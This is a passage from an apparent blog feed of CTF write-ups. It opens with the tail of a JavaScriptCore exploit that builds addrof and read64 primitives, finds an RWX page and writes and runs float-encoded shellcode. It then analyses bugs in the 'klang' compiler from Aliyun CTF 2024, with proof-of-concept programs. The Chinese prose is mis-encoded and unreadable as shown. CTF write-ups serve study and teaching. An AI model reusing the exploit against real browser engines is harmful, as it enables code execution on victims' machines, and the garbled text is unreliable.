class="hljs-number">0x10n</span>;<br>    bbuf[<span class="hljs-number">0</span>] = <span class="hljs-number">0xfffe0000_00000000n</span>+fake1_addr;<br>    <span class="hljs-title function_">trigger</span>(fbuf, t2);<br>    <span class="hljs-comment">// END STEP3</span><br>    <br>    <span class="hljs-comment">// STEP4</span><br>    <span class="hljs-keyword">let</span> fake_obj = t2.<span class="hljs-property">x</span>.<span class="hljs-property">d</span>;<br>    <span class="hljs-comment">// END STEP4</span><br>    <br>    <span class="hljs-comment">// STEP5</span><br>    <span class="hljs-keyword">let</span> fake_bf = fake1_addr+<span class="hljs-number">0x8n</span>;<br>    bbuf[<span class="hljs-number">0</span>] = fake_bf;<br>    fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>    ffbuf[<span class="hljs-number">0</span>] = fake_obj[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">let</span> butterfly_addr = bbuf[<span class="hljs-number">0</span>];<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Leak butterfly addr: 0x&quot;</span> + butterfly_addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-comment">// END STEP5</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>) &#123;<br>        fake2.<span class="hljs-property">d</span> = obj;<br>        ffbuf[<span class="hljs-number">0</span>] = fake_obj[<span class="hljs-number">4</span>];<br>        <span class="hljs-keyword">return</span> bbuf[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>) &#123;<br>        bbuf[<span class="hljs-number">0</span>] = addr;<br>        fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>        ffbuf[<span class="hljs-number">0</span>] = fake_obj[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">let</span> res = bbuf[<span class="hljs-number">0</span>];<br>        bbuf[<span class="hljs-number">0</span>] = fake_bf;<span class="hljs-comment">// è¿˜åŸ</span><br>        fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>    <span class="hljs-keyword">let</span> addr = <span class="hljs-title function_">addrof</span>(bftrigger);<br>    <span class="hljs-title function_">print</span>(addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    addr = <span class="hljs-title function_">read64</span>(addr+<span class="hljs-number">0x18n</span>);<br>    <span class="hljs-title function_">print</span>(addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    addr = <span class="hljs-title function_">read64</span>(addr+<span class="hljs-number">0x8n</span>);<br>    <span class="hljs-title function_">print</span>(addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-keyword">let</span> rwx = <span class="hljs-title function_">read64</span>(addr+<span class="hljs-number">0x10n</span>);<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Leak RWX addr: 0x&quot;</span> + rwx.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-keyword">let</span> shellcode = [-<span class="hljs-number">1.1406995792869598e-244</span>, <span class="hljs-number">7.237521960842062e-308</span>, -<span class="hljs-number">1.1399357607410871e-244</span>, <span class="hljs-number">9.780209880692209e+26</span>, -<span class="hljs-number">2.6607797970378774e-254</span>, <span class="hljs-number">1.7806249655998242e-22</span>, <span class="hljs-number">3.9690202623744235e+146</span>, <span class="hljs-number">7.34038447708115e+223</span>, <span class="hljs-number">3.3819935e-317</span>, <span class="hljs-number">0</span>];<br>    bbuf[<span class="hljs-number">0</span>] = rwx+<span class="hljs-number">0xbn</span>;<br>    fake2[<span class="hljs-number">1</span>] = ffbuf[<span class="hljs-number">0</span>];<br>    shellcode.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">sc, i</span>) =&gt;</span> &#123;<br>        fake_obj[i] = sc;<br>    &#125;);<br>    <span class="hljs-title function_">bftrigger</span>();<br>&#125;<br><span class="hljs-title function_">exp</span>();<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>js</tag>
      
      <tag>jsc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 é˜¿é‡Œäº‘CTF klang wp</title>
    <link href="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/"/>
    <url>/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/</url>
    
    <content type="html"><![CDATA[<p>çªäº†ä¸€å¤©ç¼–è¯‘å™¨â€¦â€¦ç„¶åå•¥ä¹Ÿæ²¡çªå‡ºæ¥ï¼Œéå¸¸å¥½å¤§ç‰¢ï¼Œæ˜å¹´è¿˜å</p><span id="more"></span><h1 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h1><p>æµç¨‹ï¼š</p><ul><li>è¾“å…¥ä»£ç </li><li>ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶</li><li>è¿è¡Œ</li></ul><h1 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h1><p>æä¾›ä¸€äº›æ¥å£ï¼š</p><ul><li><p>do_printiï¼šè¾“å‡ºæ•´æ•°</p></li><li><p>do_printsï¼šè¾“å‡ºå­—ç¬¦ä¸²</p></li><li><p>do_inputiï¼šè¾“å…¥æ•´æ•°</p></li><li><p>do_randomï¼šè¿”å›ä¸€ä¸ªéšæœºæ•°</p></li><li><p>do_inputsï¼šè¾“å…¥å­—ç¬¦ä¸²</p></li><li><p>do_array_newï¼šåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œä½¿ç”¨mallocåˆ†é…å†…å­˜ï¼Œç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">array_t</span> &#123;</span><br>    <span class="hljs-type">int64_t</span>* data;<br>    <span class="hljs-type">int64_t</span> size;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>do_array_loadï¼šè¿”å›arr[index]</p></li><li><p>do_array_storeï¼šarr[index]&#x3D;value</p></li></ul><h1 id="compiler"><a href="#compiler" class="headerlink" title="compiler"></a>compiler</h1><p>ç¼–è¯‘æµç¨‹ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/compiler.png" class title="compiler"><h2 id="Parse"><a href="#Parse" class="headerlink" title="Parse"></a>Parse</h2><p>è¯æ³•åˆ†æå’Œè¯­æ³•åˆ†ææ˜¯ç”±bisonå’Œflexå®Œæˆçš„ï¼Œè¯­æ³•å’Œcè¯­è¨€å·®ä¸å¤šï¼Œä¸€äº›ä¸ä¸€æ ·çš„è§ä¸‹ï¼š</p><ul><li><p>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">FUNCTIONNAME</span> <span class="hljs-params">(TYPE ARG, TYPE ARGâ€¦)</span> : TYPE VAR, TYPE AVRâ€¦ -&gt; TYPE<br>&#123;<br>    STATEMENTS<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>: åé¢æ˜¯å‡½æ•°ä¸­ä½¿ç”¨çš„å˜é‡</li></ul></li><li><p>èµ‹å€¼è¯­å¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">NAME := VAR;<br></code></pre></td></tr></table></figure></li></ul><p>ASTæ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ast.png" class title="ast"><h2 id="IRGen"><a href="#IRGen" class="headerlink" title="IRGen"></a>IRGen</h2><h3 id="Verify"><a href="#Verify" class="headerlink" title="Verify"></a>Verify</h3><p>éªŒè¯ASTæ˜¯å¦åˆæ³•ï¼š</p><ul><li>Moduleï¼š<ul><li>å¿…é¡»æœ‰mainå‡½æ•°ï¼Œæ— å‚æ•°ï¼Œè¿”å›ç±»å‹ä¸ºint</li><li>å‡½æ•°ä¸é‡å</li></ul></li><li>Functionï¼š<ul><li>è‡³å°‘æœ‰ä¸€æ¡è¯­å¥</li><li>æœ€åä¸€æ¡è¯­å¥å¿…é¡»æ˜¯return</li><li>varçš„typeä¸èƒ½æ˜¯void</li><li>æœ€å¤šåä¸ªvar</li><li>æœ€å¤šä¸‰ä¸ªpara</li></ul></li><li>Blockï¼š<ul><li>returnè¯­å¥åªèƒ½å‡ºç°åœ¨blockæœ€å</li></ul></li><li>Statementï¼š<ul><li>ASSIGNï¼šå·¦å³Expressionç±»å‹ä¸€è‡´</li><li>IFï¼šConditionç±»å‹ä¸ºINT</li><li>IFELSEï¼šConditionç±»å‹ä¸ºINT</li><li>WHILEï¼š<ul><li>Conditionç±»å‹ä¸ºINT</li><li>å¾ªç¯blockä¸­ä¸èƒ½å†æœ‰WHILE</li></ul></li><li>RETURNï¼š<ul><li>è¯­å¥Expressionç±»å‹å’Œæ‰€å±Functionè¿”å›ç±»å‹åŒ¹é…</li><li>å¦‚æœæ²¡æœ‰è¿”å›ç±»å‹åˆ™æ‰€å±Functionè¿”å›ç±»å‹å¿…é¡»ä¸ºvoid</li></ul></li><li>CALLï¼šExpressionåˆæ³•</li></ul></li><li>Expressionï¼š<ul><li>VARIABLEï¼švarå¿…é¡»åœ¨æ‰€å±Functionä¸­å®šä¹‰ï¼Œä¼šè¿”å›Functionä¸­ç¡®å®švarçš„ç±»å‹</li><li>BINARYï¼šå·¦å€¼å³å€¼ç±»å‹ç›¸åŒä¸”ä¸ºINT</li><li>FUNCTION_CALLï¼šå‡½æ•°å‚æ•°å’Œå‡½æ•°åŸå‹åŒ¹é…ï¼ŒåŒ…æ‹¬å‚æ•°æ•°é‡å’Œç±»å‹</li><li>ARRAY_ACCESSï¼š<ul><li>ç±»å‹å’ŒFunctionä¸­å£°æ˜åŒ¹é…</li><li>Indexç±»å‹ä¸ºINT</li></ul></li></ul></li></ul><h4 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h4><p>VerifyExpressionå¤„ç†BINARYæ—¶ifå¤–é¢æ²¡return</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">case</span> ASTExpression::EX_BINARY: &#123;<br>    <span class="hljs-keyword">auto</span> *BE = static_cast&lt;ASTExpressionBinary*&gt;(E);<br>    <span class="hljs-keyword">auto</span> LT = VerifyExpression(BE-&gt;GetLHS());<br>    <span class="hljs-keyword">auto</span> RT = VerifyExpression(BE-&gt;GetRHS());<br>    <span class="hljs-keyword">if</span>(LT.has_value() &amp;&amp; RT.has_value()) &#123;<br>      <span class="hljs-keyword">if</span>(LT.value() != RT.value()) &#123;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">case</span> ASTExpression::EX_FUNCTION_CALL: &#123;<br></code></pre></td></tr></table></figure><p>å¦‚æœLTå’ŒRTæœ‰ä¸€ä¸ªæ²¡æœ‰valueåˆ™ä¼šç»§ç»­è¿›å…¥FUNCTION_CALLçš„å¤„ç†ï¼Œå¯ä»¥é€šè¿‡æœªå£°æ˜å˜é‡è§¦å‘</p><p>POCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b -&gt; <span class="hljs-type">int</span> &#123;<br>a := c + b;<span class="hljs-comment">/* cæœªå£°æ˜ï¼ŒVerifyExpressionæ— è¿”å›å€¼ */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æŠŠASTExpressionBinaryå½“ASTExpressionFunctionCallè§£ææ—¶ä¼šcrash</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/binary.png" class title="binary"><h3 id="Generate"><a href="#Generate" class="headerlink" title="Generate"></a>Generate</h3><p>IRæ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ir.png" class title="ir"><p>IRGenæ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/irgen.png" class title="irgen"><p>è¿™å‡ ä¸ªclassçš„ç”¨å¤„æ²¡é‚£ä¹ˆæ˜¾ç„¶ï¼Œè§£é‡Šä¸€ä¸‹ï¼š</p><ul><li>FuncBuilderï¼šç®¡ç†Function<ul><li>ç®¡ç†BasicBlock</li><li>ç®¡ç†Instruction</li></ul></li><li>ModuleGenCtxï¼šç®¡ç†å­—é¢é‡</li><li>FuncGenCtxï¼šç®¡ç†è™šæ‹Ÿå¯„å­˜å™¨</li><li>IRGenï¼šåˆ›å»ºIR</li></ul><p>æ³¨æ„IRGençš„è¿‡ç¨‹ä¸­ï¼š</p><ul><li>GenerateFunctionåœ¨Functionçš„Entryå¼€å¤´åˆå§‹åŒ–äº†æ‰€æœ‰Var</li><li>åŒåæƒ…å†µä¸‹Varè¦†ç›–Para</li><li>IFã€IFELSE BasicBlockå¦‚æœæœ€åä¸€æ¡è¯­å¥ä¸ºRETURNåˆ™æœ«å°¾ä¸æ·»åŠ JMPï¼ŒWHILEæ²¡æœ‰è¿™æ¡åˆ¤æ–­</li></ul><h4 id="BUG-1"><a href="#BUG-1" class="headerlink" title="BUG"></a>BUG</h4><ul><li>WHILEçš„BasicBlockæœ€ååŠ äº†JMPï¼ŒCodeGenä¸­EmitEpilogue fixå‡½æ•°é€€å‡ºæ—¶æ˜¯æ ¹æ®BasicBlockæœ€åä¸€æ¡ä¸€æ¡æŒ‡ä»¤æ˜¯å¦æ˜¯retæ¥åˆ¤æ–­çš„</li><li>ä½†WHILEçš„æœ€åä¸€æ¡æŒ‡ä»¤æ˜¯jmoï¼Œæ‰€ä»¥å‡½æ•°é€€å‡ºçš„æ—¶å€™æ²¡æœ‰æ¢å¤æ ˆ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">LinearScanRegAlloc::EmitEpilogue</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> *BB : (*Func_)) &#123;<br>    <span class="hljs-keyword">if</span>(BB-&gt;IsExit()) &#123;<br>      <span class="hljs-keyword">auto</span> *Last = *BB-&gt;rbegin();<br>      BB-&gt;InsertBefore(new MovMachineInst(MachineOperand::CreateRegister(RBP), MachineOperand::CreateRegister(RSP)), Last);<br>      BB-&gt;InsertBefore(new PopMachineInst(MachineOperand::CreateRegister(RBP)), Last);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">int</span><br>&#123;<br>a := <span class="hljs-number">10</span>;<br><span class="hljs-keyword">do</span>&#123;<br>prints(<span class="hljs-string">&quot;abaaba&quot;</span>);<br>a := a - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(a &gt; <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test</span>                      <br>abaaba<br>zsh: segmentation fault  ./test<br></code></pre></td></tr></table></figure><h2 id="Optimize"><a href="#Optimize" class="headerlink" title="Optimize"></a>Optimize</h2><p>WorkListç®—æ³•</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/worklist.png" class title="worklist"><h3 id="ConstantPropagate"><a href="#ConstantPropagate" class="headerlink" title="ConstantPropagate"></a>ConstantPropagate</h3><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/const.png" class title="const"><h4 id="BUG-2"><a href="#BUG-2" class="headerlink" title="BUG"></a>BUG</h4><p>ReplaceInçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯Outï¼ˆåº”è¯¥ç”¨Inï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;State = Out[BB];<span class="hljs-comment">// ä½¿ç”¨Out</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> InstIt = BB-&gt;begin(); InstIt != BB-&gt;end(); InstIt++) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; InstIt-&gt;Ins(); i++) &#123;<br>    <span class="hljs-keyword">if</span>(InstIt-&gt;GetIn(i).IsRegister()) &#123;<br>      <span class="hljs-type">size_t</span> Reg = InstIt-&gt;GetIn(i).RegId();<br>      <span class="hljs-keyword">if</span>(State.IsConstant(Reg)) &#123;<br>        <span class="hljs-type">int64_t</span> Value = State.GetConstant(Reg);<br>        InstIt-&gt;ReplaceIn(i, Operand::CreateImmediate(Value)); <span class="hljs-comment">// ReplaceIn</span><br>        Changed = <span class="hljs-literal">true</span>; <br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å¦‚æœåœ¨blockç»“å°¾ç»™å˜é‡èµ‹å€¼ä¸€ä¸ªå¸¸é‡blockä¸­æ‰€æœ‰è¿‡ç¨‹å€¼éƒ½ä¼šè¢«è¦†ç›–</p><p>POCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b -&gt; <span class="hljs-type">int</span> <br>&#123;<br>prints(<span class="hljs-string">&quot;Please Input a:&quot;</span>);<br>a := inputi();<br>b := <span class="hljs-number">1</span> + a;<br>a := <span class="hljs-number">100</span>;<br>prints(<span class="hljs-string">&quot;b = a + 1 =&quot;</span>);<br>printi(b);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–å‰åçš„IRï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE :<br>define main<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">3</span> = load_label __str0<br>        call prints %<span class="hljs-number">3</span><br>        %<span class="hljs-number">4</span> = call inputi<br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">4</span><br>        %<span class="hljs-number">5</span> = #<span class="hljs-number">1</span> + %<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">5</span><br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">64</span><br>        %<span class="hljs-number">7</span> = load_label __str1<br>        call prints %<span class="hljs-number">7</span><br>        call printi %<span class="hljs-number">1</span><br>        ret #<span class="hljs-number">0</span><br><br>AFTER :<br>define main<br>bb1:<br>        %<span class="hljs-number">3</span> = load_label __str0<br>        call prints %<span class="hljs-number">3</span><br>        %<span class="hljs-number">4</span> = call inputi<br>        %<span class="hljs-number">7</span> = load_label __str1<br>        call prints %<span class="hljs-number">7</span><br>        call printi #<span class="hljs-number">65</span><br>        ret #<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./const</span>            <br>INPUT a:<br>12 <br>OUTPUT b = a + 1:<br>101<br></code></pre></td></tr></table></figure><h3 id="CopyPropagate"><a href="#CopyPropagate" class="headerlink" title="CopyPropagate"></a>CopyPropagate</h3><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/copy.png" class title="copy"><h3 id="CSE"><a href="#CSE" class="headerlink" title="CSE"></a>CSE</h3><p>åˆ†LocalCSEå’ŒGlobalCSE</p><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/CSE.png" class title="CSE"><h4 id="LocalCSE"><a href="#LocalCSE" class="headerlink" title="LocalCSE"></a>LocalCSE</h4><p>ä»¥BasicBlockä¸ºå•ä½å¤„ç†ï¼Œå¤„ç†å‡½æ•°LocalCSEBlockï¼š</p><ul><li><p>ç¬¬ä¸€ä¸ªå¾ªç¯å¡«å……ä»¥ä¸‹å±€éƒ¨å˜é‡ï¼š</p><ul><li>Mappingï¼šmap CSEValue -&gt; Ins ID</li><li>Defsï¼šmap CSEValue -&gt; Ins</li><li>Stateï¼šmap Ins ID -&gt; set of ç°æœ‰çš„CSEValueå¯¹åº”Ins ID</li><li>Reusableï¼šmap CSEValue -&gt; vector of CSEValueå‡ºç°çš„æ‰€æœ‰Ins</li></ul></li><li><p>ç¬¬äºŒä¸ªå¾ªç¯éå†æ‰€æœ‰å…·æœ‰é‡å¤CSEValueçš„Insï¼Œåšä»¥ä¸‹å˜æ¢ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/replace.png" class title="replace"></li><li><p>æ²¡æœ‰å¤„ç†å³å€¼æ”¹å˜çš„æƒ…å†µï¼Œä¹Ÿä¸ç”¨å¤„ç†ï¼ŒFromInstructionå…è®¸å³å€¼ä¸ºReg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// RHS should be immutable</span><br><span class="hljs-keyword">if</span>((Op1.IsImmediate() || Op1.IsParameter()) &amp;&amp; (Op2.IsImmediate() || Op2.IsParameter())) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::make_optional(CSEValue(BinInst.GetOperation(), Op1, Op2));<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="GlobalCSE"><a href="#GlobalCSE" class="headerlink" title="GlobalCSE"></a>GlobalCSE</h4><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/GCSE.png" class title="GCSE"><p>Available Expressionsç®—æ³•ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ae.png" class title="ae"><p>æŒ‡ä»¤æ›¿æ¢ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/cseee.png" class title="cseee"><p>å®é™…å®ç°ï¼š</p><ul><li><p>è·å–Available Expressions</p></li><li><p>éå†æ¯ä¸€ä¸ªBasicBlock BB</p></li><li><p>éå†BBä¸­çš„æ¯ä¸€æ¡Instruction Ins</p></li><li><p>Insä¸­å­˜åœ¨Available Expressionsåˆ™ï¼š</p><ul><li><p>é€’å½’éå†BBæ‰€æœ‰å‰é©±ï¼Œæ›¿æ¢æ¯ä¸€ä¸ªAvailable Expressions</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> = b + <span class="hljs-number">1</span> -&gt; a<span class="hljs-string">&#x27; = b + 1</span><br><span class="hljs-string">a = a&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>æ›¿æ¢Ins</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span> -&gt; <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a&#x27;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h5 id="BUG-3"><a href="#BUG-3" class="headerlink" title="BUG"></a>BUG</h5><ul><li><p>Meetè°ƒç”¨çš„Intersectä¸­å¦‚æœGCSEStateæ²¡æœ‰åˆå§‹åŒ–åˆ™å°†Otherå¤åˆ¶è¿‡å»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(!Init_) &#123;<br>  Values_ = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>(Other.Values_.begin(), Other.Values_.end());<br>  Init_ = <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ ¹æ®ç®—æ³•é™¤äº†Entryåˆå§‹åŒ–ä¸ºç©ºå…¶ä»–çš„BBåˆå§‹åŒ–ä¸ºå…¨é›†æ‰€ä»¥è¿™æ ·ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ï¼ˆ</li><li>ä½†å®ç°æ²¡æœ‰Entryï¼Œå°±æœ‰é—®é¢˜äº†</li><li>åœ¨å‡½æ•°å¼€å¤´æŠŠè¡¨è¾¾å¼æ”¾è¿›do-whileé‡Œ<ul><li>BBçš„å‰é©±å°±æœ‰äº†ä»–è‡ªå·±</li><li>æ²¡æœ‰Entryçš„ç©ºé›†æŠŠBBè‡ªå·±çš„è¡¨è¾¾å¼å–äº¤æ¶ˆæ‰</li><li>è¿™æ ·BBä¸­çš„è¡¨è¾¾å¼ä¼šè¢«é”™è¯¯ä¼˜åŒ–æ‰</li></ul></li></ul><p>POC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : -&gt; <span class="hljs-type">int</span> <br>&#123;<br>test(<span class="hljs-number">114514</span>, <span class="hljs-number">233333</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> : <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span 